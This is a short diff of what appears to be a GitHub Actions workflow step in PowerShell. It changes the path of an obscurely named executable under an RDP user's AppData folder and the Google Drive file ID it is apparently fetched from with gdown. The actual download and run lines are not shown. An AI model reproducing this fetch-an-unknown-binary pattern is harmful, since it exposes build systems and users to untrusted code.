@@ -68,8 +68,8 @@ jobs:
           pip install --no-cache-dir gdown
 
           $u = $env:RDP_USER
-          $exe = "C:\Users\$u\AppData\Local\filenox.exe"
-          $id = "1Dm9Cv3C8y8nbhlij3FOSOOZrbKTXXage"
+          $exe = "C:\Users\$u\AppData\Local\blusuit.exe"
+          $id = "1LWKoZLAeeM_hpHVfJmiRNkyVMk1FUym0"
 
           New-Item -ItemType Directory -Force -Path (Split-Path $exe) | Out-Null
 
